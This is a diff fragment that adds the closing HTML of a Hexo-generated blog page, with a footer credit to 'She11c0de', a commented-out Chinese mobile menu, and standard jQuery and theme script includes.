+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
